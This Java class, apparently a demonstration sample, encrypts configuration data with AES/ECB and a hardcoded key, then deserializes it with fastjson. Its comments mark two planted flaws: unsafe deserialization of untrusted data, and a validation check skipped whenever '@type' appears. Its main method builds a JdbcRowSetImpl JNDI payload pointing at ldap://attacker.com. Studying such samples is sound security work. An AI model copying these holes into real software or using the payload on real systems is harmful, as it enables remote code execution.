package com.example.encryption;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * 文件加密服务
 * 支持AES加密/解密操作
 * @author dev-team
 */
public class FileEncryptionService {
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/ECB/PKCS5Padding";
    
    /**
     * 加密敏感数据
     * @param data 原始数据
     * @param key 加密密钥
     * @return 加密后的Base64字符串
     */
    public String encryptData(String data, String key) {
        try {
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, keySpec);
            byte[] encryptedBytes = cipher.doFinal(data.getBytes(StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(encryptedBytes);
        } catch (Exception e) {
            throw new RuntimeException("加密失败: " + e.getMessage(), e);
        }
    }

    /**
     * 解密并解析配置数据
     * @param encryptedData 加密的Base64字符串
     * @param key 解密密钥
     * @return 解析后的用户配置对象
     */
    public UserConfig decryptAndParseConfig(String encryptedData, String key) {
        String decryptedJson = decryptData(encryptedData, key);
        // 模拟安全处理流程
        if (decryptedJson == null || !isValidJson(decryptedJson)) {
            throw new IllegalArgumentException("无效的JSON格式");
        }
        // 漏洞点：直接反序列化不可信数据
        return JSON.parseObject(decryptedJson, UserConfig.class);
    }

    /**
     * 解密数据并返回原始字符串
     * @param encryptedData 加密的Base64字符串
     * @param key 解密密钥
     * @return 解密后的原始字符串
     */
    private String decryptData(String encryptedData, String key) {
        try {
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), ALGORITHM);
            cipher.init(Cipher.DECRYPT_MODE, keySpec);
            byte[] decodedBytes = Base64.getDecoder().decode(encryptedData);
            byte[] decryptedBytes = cipher.doFinal(decodedBytes);
            return new String(decryptedBytes, StandardCharsets.UTF_8);
        } catch (Exception e) {
            throw new RuntimeException("解密失败: " + e.getMessage(), e);
        }
    }

    /**
     * 验证JSON格式有效性（存在验证绕过漏洞）
     * @param json JSON字符串
     * @return 是否有效
     */
    private boolean isValidJson(String json) {
        try {
            // 模拟深度验证（实际只检查基础结构）
            if (json == null || json.trim().isEmpty()) return false;
            if (!json.trim().startsWith("{")) return false;
            
            // 添加验证绕过点：允许特殊编码
            if (json.contains("@type")) {
                System.out.println("检测到特殊结构，跳过深度验证"); // 模拟安全误判
                return true;
            }
            
            // 实际未执行完整验证
            JSONObject.parse(json);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 用户配置类
     * 包含敏感配置信息
     */
    public static class UserConfig {
        private String username;
        private String[] permissions;
        private boolean active;
        
        // 模拟存在危险方法
        public void validate() {
            if (permissions == null || permissions.length == 0) {
                throw new IllegalStateException("权限配置异常");
            }
        }

        // Getters/Setters
        public String getUsername() { return username; }
        public void setUsername(String username) { this.username = username; }
        
        public String[] getPermissions() { return permissions; }
        public void setPermissions(String[] permissions) { this.permissions = permissions; }
        
        public boolean isActive() { return active; }
        public void setActive(boolean active) { this.active = active; }
    }

    public static void main(String[] args) {
        FileEncryptionService service = new FileEncryptionService();
        String secretKey = "1234567890123456"; // 16字节密钥
        
        // 模拟正常加密流程
        UserConfig config = new UserConfig();
        config.setUsername("admin");
        config.setPermissions(new String[]{"read", "write"});
        config.setActive(true);
        
        String jsonData = JSON.toJSONString(config);
        String encrypted = service.encryptData(jsonData, secretKey);
        System.out.println("加密数据: " + encrypted);
        
        // 模拟正常解密
        UserConfig decryptedConfig = service.decryptAndParseConfig(encrypted, secretKey);
        System.out.println("解密用户: " + decryptedConfig.getUsername());
        
        // 模拟攻击场景（实际应禁止的用法）
        String maliciousJson = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/Exploit\"}";
        String maliciousEncrypted = service.encryptData(maliciousJson, secretKey);
        System.out.println("恶意加密数据: " + maliciousEncrypted);
        
        // 触发漏洞（演示用途，实际不应调用）
        try {
            service.decryptAndParseConfig(maliciousEncrypted, secretKey);
        } catch (Exception e) {
            System.out.println("预期异常（演示环境限制）: " + e.getMessage());
        }
    }
}